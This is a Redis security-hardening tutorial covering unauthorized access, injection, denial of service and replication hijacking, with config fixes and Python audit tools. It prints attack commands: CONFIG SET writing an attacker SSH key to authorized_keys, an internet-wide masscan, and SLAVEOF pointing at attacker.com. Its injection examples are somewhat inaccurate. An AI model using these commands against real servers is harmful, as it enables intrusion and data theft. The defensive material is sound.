# How to Protect Redis from Common Attack Vectors

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: Redis, Security, Attack Vectors, Unauthorized Access, DoS, Injection, Hardening

Description: A comprehensive guide to protecting Redis from common attack vectors including unauthorized access, command injection, denial of service attacks, and data exfiltration, with practical mitigation strategies and security hardening techniques.

---

Redis has been a frequent target of attackers due to widespread deployment with default configurations. Understanding common attack vectors and implementing proper defenses is crucial for production deployments. This guide covers the most common Redis attacks and how to protect against them.

## Common Redis Attack Vectors

### 1. Unauthorized Access
- Open Redis instances on the internet
- Default configuration without authentication
- Weak or leaked passwords

### 2. Command Injection
- Exploiting EVAL with untrusted input
- Malicious key names
- Protocol manipulation

### 3. Denial of Service
- Resource exhaustion attacks
- Slow query attacks
- Connection flooding

### 4. Data Exfiltration
- Reading sensitive data
- Dumping databases
- Replication hijacking

## Attack Vector 1: Unauthorized Access

### The Risk

Thousands of Redis instances are exposed to the internet without authentication, allowing attackers to:
- Read all data
- Delete all data
- Use Redis as a pivot for further attacks
- Install cryptocurrency miners

### How Attackers Find Open Redis

```bash
# Shodan search
port:6379 -auth

# Masscan for quick discovery
masscan 0.0.0.0/0 -p6379 --rate 10000

# Simple connection test
redis-cli -h target.com PING
```

### The Infamous CONFIG Exploit

```bash
# Attacker writes SSH key to authorized_keys
redis-cli -h victim.com
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET payload "ssh-rsa AAAA...attacker-key..."
SAVE
```

### Protection Measures

```bash
# 1. Enable authentication
requirepass YourVeryStrongPassword123!@#

# 2. Bind to localhost only
bind 127.0.0.1

# 3. Enable protected mode
protected-mode yes

# 4. Disable CONFIG command
rename-command CONFIG ""

# 5. Use ACLs to restrict commands
ACL SETUSER default off
ACL SETUSER app on >password ~* +@all -config -debug -shutdown

# 6. Firewall rules
iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP
```

### Python Security Check

```python
import redis
import socket

def check_redis_exposure(host, port=6379):
    """Check if Redis is exposed and vulnerable."""
    vulnerabilities = []

    # Check if port is open
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((host, port))
        sock.close()

        if result != 0:
            return {'exposed': False, 'message': 'Port closed'}
    except:
        return {'exposed': False, 'message': 'Connection failed'}

    # Try connecting without auth
    try:
        r = redis.Redis(host=host, port=port, socket_timeout=3)
        r.ping()
        vulnerabilities.append('NO_AUTH - Redis accepts connections without password!')

        # Check if CONFIG is available
        try:
            r.config_get('dir')
            vulnerabilities.append('CONFIG_AVAILABLE - CONFIG command is not disabled!')
        except redis.ResponseError:
            pass

        # Check if KEYS is available
        try:
            r.keys('*')
            vulnerabilities.append('KEYS_AVAILABLE - KEYS command is not disabled!')
        except redis.ResponseError:
            pass

    except redis.AuthenticationError:
        pass  # Good - auth required
    except redis.ResponseError as e:
        if 'NOAUTH' in str(e):
            pass  # Good - auth required
        else:
            vulnerabilities.append(f'ERROR: {e}')

    return {
        'exposed': len(vulnerabilities) > 0,
        'vulnerabilities': vulnerabilities
    }

# Check
result = check_redis_exposure('your-redis-host')
if result['exposed']:
    print("WARNING: Redis is vulnerable!")
    for vuln in result['vulnerabilities']:
        print(f"  - {vuln}")
```

## Attack Vector 2: Command Injection

### Lua Script Injection

```bash
# Dangerous: Untrusted input in EVAL
EVAL "return redis.call('GET', KEYS[1])" 1 user_input

# Attacker input: "'; redis.call('FLUSHALL'); --"
```

### Key Name Injection

```python
# Vulnerable code
def get_user_data(user_id):
    return redis.get(f"user:{user_id}:data")

# Attacker provides: "../../../etc/passwd"
# Or uses special characters to manipulate commands
```

### Protection Measures

```python
import re

class SafeRedisClient:
    """Redis client with injection protection."""

    def __init__(self, redis_client):
        self.redis = redis_client
        self.key_pattern = re.compile(r'^[a-zA-Z0-9:_-]+$')

    def validate_key(self, key: str) -> bool:
        """Validate key name to prevent injection."""
        if not key or len(key) > 1024:
            return False
        return bool(self.key_pattern.match(key))

    def safe_get(self, key: str):
        """Get with key validation."""
        if not self.validate_key(key):
            raise ValueError(f"Invalid key: {key}")
        return self.redis.get(key)

    def safe_set(self, key: str, value, **kwargs):
        """Set with key validation."""
        if not self.validate_key(key):
            raise ValueError(f"Invalid key: {key}")
        return self.redis.set(key, value, **kwargs)

    def safe_eval(self, script: str, keys: list, args: list):
        """
        Execute Lua script safely.
        Use EVALSHA with pre-registered scripts only.
        """
        # Only allow pre-approved script hashes
        allowed_scripts = {
            'abc123...': 'increment_with_limit',
            'def456...': 'atomic_transfer',
        }

        script_hash = hashlib.sha1(script.encode()).hexdigest()
        if script_hash not in allowed_scripts:
            raise ValueError("Unauthorized script")

        # Validate keys
        for key in keys:
            if not self.validate_key(key):
                raise ValueError(f"Invalid key in script: {key}")

        return self.redis.evalsha(script_hash, len(keys), *keys, *args)


# Usage
safe_redis = SafeRedisClient(redis.Redis())

# This works
safe_redis.safe_set("user:123:name", "John")

# This raises ValueError
try:
    safe_redis.safe_set("user:../../../etc/passwd", "hack")
except ValueError as e:
    print(f"Blocked: {e}")
```

### Disable Dangerous Commands

```bash
# redis.conf
rename-command EVAL ""
rename-command EVALSHA ""
rename-command SCRIPT ""
rename-command DEBUG ""
rename-command CONFIG ""
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command KEYS ""
```

## Attack Vector 3: Denial of Service

### Types of DoS Attacks

1. **Connection Exhaustion**: Open thousands of connections
2. **Memory Exhaustion**: Write huge values
3. **CPU Exhaustion**: Run expensive commands (KEYS, SMEMBERS on large sets)
4. **Slow Query Attack**: Block Redis with long-running operations

### Protection Measures

```bash
# redis.conf - Connection limits
maxclients 10000
timeout 300  # Close idle connections

# Memory limits
maxmemory 4gb
maxmemory-policy volatile-lru

# Client output buffer limits (prevent slow consumers)
client-output-buffer-limit normal 256mb 128mb 60
client-output-buffer-limit replica 512mb 256mb 120
client-output-buffer-limit pubsub 32mb 8mb 60

# Slow query protection
slowlog-log-slower-than 10000
slowlog-max-len 1000

# Disable dangerous commands
rename-command KEYS ""
rename-command DEBUG ""
```

### Rate Limiting Implementation

```python
import redis
import time
from functools import wraps

class RedisRateLimiter:
    """Rate limiter to prevent abuse."""

    def __init__(self, redis_client, prefix='ratelimit'):
        self.redis = redis_client
        self.prefix = prefix

    def is_rate_limited(self, identifier: str, max_requests: int,
                        window_seconds: int) -> tuple:
        """
        Check if identifier is rate limited.
        Returns (is_limited, remaining, reset_time)
        """
        key = f"{self.prefix}:{identifier}"
        now = time.time()
        window_start = now - window_seconds

        pipe = self.redis.pipeline()

        # Remove old entries
        pipe.zremrangebyscore(key, 0, window_start)

        # Count requests in window
        pipe.zcard(key)

        # Add current request
        pipe.zadd(key, {str(now): now})

        # Set expiry
        pipe.expire(key, window_seconds)

        results = pipe.execute()
        request_count = results[1]

        is_limited = request_count >= max_requests
        remaining = max(0, max_requests - request_count - 1)

        # Get oldest entry for reset time
        oldest = self.redis.zrange(key, 0, 0, withscores=True)
        if oldest:
            reset_time = oldest[0][1] + window_seconds
        else:
            reset_time = now + window_seconds

        return is_limited, remaining, reset_time

    def rate_limit_decorator(self, max_requests: int, window_seconds: int,
                             key_func=None):
        """Decorator for rate limiting functions."""
        def decorator(func):
            @wraps(func)
            def wrapper(*args, **kwargs):
                # Generate identifier
                if key_func:
                    identifier = key_func(*args, **kwargs)
                else:
                    identifier = func.__name__

                is_limited, remaining, reset_time = self.is_rate_limited(
                    identifier, max_requests, window_seconds
                )

                if is_limited:
                    raise Exception(f"Rate limited. Reset at {reset_time}")

                return func(*args, **kwargs)
            return wrapper
        return decorator


# Usage
limiter = RedisRateLimiter(redis.Redis())

# Check rate limit
is_limited, remaining, reset = limiter.is_rate_limited(
    identifier="user:123",
    max_requests=100,
    window_seconds=60
)

if is_limited:
    print(f"Rate limited! Try again at {reset}")
```

### Protection Against Large Keys

```python
class ProtectedRedisClient:
    """Redis client with size limits."""

    MAX_KEY_SIZE = 1024  # 1KB key names
    MAX_VALUE_SIZE = 10 * 1024 * 1024  # 10MB values
    MAX_LIST_SIZE = 100000  # List elements

    def __init__(self, redis_client):
        self.redis = redis_client

    def set(self, key: str, value, **kwargs):
        """Set with size validation."""
        if len(key) > self.MAX_KEY_SIZE:
            raise ValueError(f"Key too large: {len(key)} > {self.MAX_KEY_SIZE}")

        value_size = len(str(value).encode())
        if value_size > self.MAX_VALUE_SIZE:
            raise ValueError(f"Value too large: {value_size} > {self.MAX_VALUE_SIZE}")

        return self.redis.set(key, value, **kwargs)

    def lpush(self, key: str, *values):
        """LPUSH with list size check."""
        current_size = self.redis.llen(key)
        if current_size + len(values) > self.MAX_LIST_SIZE:
            raise ValueError(f"List would exceed max size: {self.MAX_LIST_SIZE}")
        return self.redis.lpush(key, *values)

    def sadd(self, key: str, *members):
        """SADD with set size check."""
        current_size = self.redis.scard(key)
        if current_size + len(members) > self.MAX_LIST_SIZE:
            raise ValueError("Set would exceed max size")
        return self.redis.sadd(key, *members)
```

## Attack Vector 4: Data Exfiltration

### Risks

- Unauthorized data access
- Database dumps
- Replication hijacking (SLAVEOF attack)

### SLAVEOF Attack

```bash
# Attacker sets up rogue master and makes victim replicate from it
redis-cli -h victim.com SLAVEOF attacker.com 6379
```

### Protection Measures

```bash
# Disable SLAVEOF command
rename-command SLAVEOF ""
rename-command REPLICAOF ""

# If using replication, set master auth
masterauth your-master-password

# Use ACLs to restrict replication
ACL SETUSER replica on >replica-pass +psync +replconf +ping
```

### Data Access Logging

```python
import redis
import logging
from datetime import datetime
from functools import wraps

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('redis_audit')

class AuditedRedisClient:
    """Redis client with access logging."""

    SENSITIVE_PATTERNS = ['password', 'secret', 'key', 'token', 'auth']

    def __init__(self, redis_client, user_id=None):
        self.redis = redis_client
        self.user_id = user_id

    def _is_sensitive(self, key: str) -> bool:
        """Check if key might contain sensitive data."""
        key_lower = key.lower()
        return any(pattern in key_lower for pattern in self.SENSITIVE_PATTERNS)

    def _log_access(self, operation: str, key: str, success: bool,
                    extra: dict = None):
        """Log data access."""
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'user_id': self.user_id,
            'operation': operation,
            'key': key,
            'sensitive': self._is_sensitive(key),
            'success': success,
        }
        if extra:
            log_entry.update(extra)

        if self._is_sensitive(key):
            logger.warning(f"Sensitive data access: {log_entry}")
        else:
            logger.info(f"Data access: {log_entry}")

    def get(self, key: str):
        """Get with audit logging."""
        try:
            result = self.redis.get(key)
            self._log_access('GET', key, success=True)
            return result
        except Exception as e:
            self._log_access('GET', key, success=False, extra={'error': str(e)})
            raise

    def set(self, key: str, value, **kwargs):
        """Set with audit logging."""
        try:
            result = self.redis.set(key, value, **kwargs)
            self._log_access('SET', key, success=True)
            return result
        except Exception as e:
            self._log_access('SET', key, success=False, extra={'error': str(e)})
            raise

    def delete(self, *keys):
        """Delete with audit logging."""
        for key in keys:
            self._log_access('DELETE', key, success=True)
        return self.redis.delete(*keys)


# Usage
audited_client = AuditedRedisClient(redis.Redis(), user_id='user123')
audited_client.get('user:password:hash')  # Logs warning for sensitive access
```

## Security Hardening Checklist

```python
#!/usr/bin/env python3
"""Redis Security Hardening Checker"""

import redis
import socket

class RedisSecurityChecker:
    def __init__(self, host, port=6379, password=None):
        self.host = host
        self.port = port
        self.password = password
        self.checks = []

    def run_all_checks(self):
        """Run all security checks."""
        self._check_network_exposure()
        self._check_authentication()
        self._check_dangerous_commands()
        self._check_protected_mode()
        self._check_bind_address()
        self._check_tls()
        self._check_acl()
        self._check_maxmemory()
        self._check_client_limits()

        return self.checks

    def _add_check(self, name, passed, message, severity='medium'):
        self.checks.append({
            'name': name,
            'passed': passed,
            'message': message,
            'severity': severity
        })

    def _check_network_exposure(self):
        """Check if Redis is exposed to public network."""
        try:
            # Try connecting from outside
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.host, self.port))
            sock.close()

            if result == 0:
                # Check if this is a public IP
                import ipaddress
                try:
                    ip = ipaddress.ip_address(self.host)
                    if ip.is_global:
                        self._add_check(
                            'Network Exposure',
                            False,
                            'Redis is exposed on public IP!',
                            'critical'
                        )
                        return
                except:
                    pass

            self._add_check('Network Exposure', True, 'Redis not publicly exposed')
        except:
            self._add_check('Network Exposure', True, 'Unable to check exposure')

    def _check_authentication(self):
        """Check if authentication is required."""
        try:
            r = redis.Redis(host=self.host, port=self.port, socket_timeout=3)
            r.ping()
            self._add_check(
                'Authentication',
                False,
                'No authentication required!',
                'critical'
            )
        except redis.AuthenticationError:
            self._add_check('Authentication', True, 'Authentication is enabled')
        except:
            pass

    def _check_dangerous_commands(self):
        """Check if dangerous commands are available."""
        if not self.password:
            return

        r = redis.Redis(
            host=self.host,
            port=self.port,
            password=self.password,
            socket_timeout=3
        )

        dangerous_cmds = ['CONFIG', 'DEBUG', 'FLUSHALL', 'FLUSHDB', 'KEYS', 'SHUTDOWN']

        for cmd in dangerous_cmds:
            try:
                if cmd == 'CONFIG':
                    r.config_get('maxmemory')
                    self._add_check(
                        f'Command {cmd}',
                        False,
                        f'{cmd} command is available',
                        'high'
                    )
                elif cmd == 'KEYS':
                    r.keys('__nonexistent__')
                    self._add_check(
                        f'Command {cmd}',
                        False,
                        f'{cmd} command is available',
                        'medium'
                    )
            except redis.ResponseError as e:
                if 'unknown command' in str(e).lower():
                    self._add_check(f'Command {cmd}', True, f'{cmd} is disabled')

    def _check_protected_mode(self):
        """Check protected mode setting."""
        if not self.password:
            return

        r = redis.Redis(
            host=self.host,
            port=self.port,
            password=self.password
        )

        try:
            protected = r.config_get('protected-mode').get('protected-mode', 'yes')
            if protected == 'no':
                self._add_check(
                    'Protected Mode',
                    False,
                    'Protected mode is disabled',
                    'medium'
                )
            else:
                self._add_check('Protected Mode', True, 'Protected mode is enabled')
        except:
            pass

    def _check_bind_address(self):
        """Check bind address configuration."""
        if not self.password:
            return

        r = redis.Redis(
            host=self.host,
            port=self.port,
            password=self.password
        )

        try:
            bind = r.config_get('bind').get('bind', '')
            if '0.0.0.0' in bind or bind == '':
                self._add_check(
                    'Bind Address',
                    False,
                    'Redis bound to all interfaces',
                    'high'
                )
            else:
                self._add_check('Bind Address', True, f'Bound to: {bind}')
        except:
            pass

    def _check_tls(self):
        """Check TLS configuration."""
        if not self.password:
            return

        r = redis.Redis(
            host=self.host,
            port=self.port,
            password=self.password
        )

        try:
            tls_port = r.config_get('tls-port').get('tls-port', '0')
            if tls_port == '0':
                self._add_check(
                    'TLS',
                    False,
                    'TLS is not configured',
                    'medium'
                )
            else:
                self._add_check('TLS', True, f'TLS enabled on port {tls_port}')
        except:
            pass

    def _check_acl(self):
        """Check ACL configuration."""
        if not self.password:
            return

        r = redis.Redis(
            host=self.host,
            port=self.port,
            password=self.password
        )

        try:
            users = r.acl_list()
            if len(users) <= 1:
                self._add_check(
                    'ACL',
                    False,
                    'Only default user configured',
                    'medium'
                )
            else:
                self._add_check('ACL', True, f'{len(users)} users configured')
        except:
            self._add_check('ACL', False, 'ACL not available', 'low')

    def _check_maxmemory(self):
        """Check maxmemory setting."""
        if not self.password:
            return

        r = redis.Redis(
            host=self.host,
            port=self.port,
            password=self.password
        )

        try:
            maxmem = int(r.config_get('maxmemory').get('maxmemory', 0))
            if maxmem == 0:
                self._add_check(
                    'Max Memory',
                    False,
                    'maxmemory not set - risk of OOM',
                    'medium'
                )
            else:
                self._add_check('Max Memory', True, f'maxmemory: {maxmem / 1024 / 1024:.0f}MB')
        except:
            pass

    def _check_client_limits(self):
        """Check client limits."""
        if not self.password:
            return

        r = redis.Redis(
            host=self.host,
            port=self.port,
            password=self.password
        )

        try:
            timeout = int(r.config_get('timeout').get('timeout', 0))
            if timeout == 0:
                self._add_check(
                    'Client Timeout',
                    False,
                    'No client timeout - idle connections persist',
                    'low'
                )
            else:
                self._add_check('Client Timeout', True, f'Timeout: {timeout}s')
        except:
            pass

    def print_report(self):
        """Print security report."""
        checks = self.run_all_checks()

        print("\n" + "=" * 60)
        print("REDIS SECURITY CHECK REPORT")
        print("=" * 60)

        critical = [c for c in checks if not c['passed'] and c['severity'] == 'critical']
        high = [c for c in checks if not c['passed'] and c['severity'] == 'high']
        medium = [c for c in checks if not c['passed'] and c['severity'] == 'medium']
        passed = [c for c in checks if c['passed']]

        if critical:
            print("\n[CRITICAL]")
            for c in critical:
                print(f"  X {c['name']}: {c['message']}")

        if high:
            print("\n[HIGH]")
            for c in high:
                print(f"  ! {c['name']}: {c['message']}")

        if medium:
            print("\n[MEDIUM]")
            for c in medium:
                print(f"  ~ {c['name']}: {c['message']}")

        if passed:
            print("\n[PASSED]")
            for c in passed:
                print(f"  + {c['name']}: {c['message']}")

        score = len(passed) / len(checks) * 100 if checks else 0
        print(f"\nSecurity Score: {score:.0f}%")


# Usage
checker = RedisSecurityChecker('localhost', password='your-password')
checker.print_report()
```

## Conclusion

Protecting Redis requires a multi-layered approach:

1. **Authentication**: Always require passwords or use ACLs
2. **Network isolation**: Bind to localhost, use firewalls
3. **Command restrictions**: Disable or rename dangerous commands
4. **Input validation**: Sanitize all user input
5. **Resource limits**: Set maxmemory, timeouts, and client limits
6. **Monitoring**: Log and alert on suspicious activity
7. **Encryption**: Use TLS for data in transit
8. **Regular audits**: Check configuration and update regularly

By implementing these protections, you can significantly reduce the attack surface of your Redis deployment.
